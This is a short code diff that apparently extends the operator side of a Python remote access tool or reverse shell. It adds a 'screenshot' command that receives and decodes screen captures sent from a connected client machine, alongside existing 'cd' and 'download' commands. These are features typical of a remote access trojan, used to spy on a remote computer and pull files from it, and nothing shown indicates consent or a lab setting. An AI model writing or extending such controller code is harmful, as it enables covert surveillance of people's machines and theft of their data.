@@ -28,7 +28,13 @@ def shell():
             continue
         elif cmd[:2] == "cd" and len(cmd) > 2: #only if cd and a path (if cd only it runs as normal command)
             continue
-
+        elif cmd[:10] == "screenshot":
+            with open("screenshot_client","wb") as f:
+                data = recv_j()
+                print(data)
+                f.write(base64.b64decode(data))
+                f.close()
+            continue
         elif cmd[:8] == "download":
             with open(cmd[9:],"wb") as f:
                 data = recv_j()
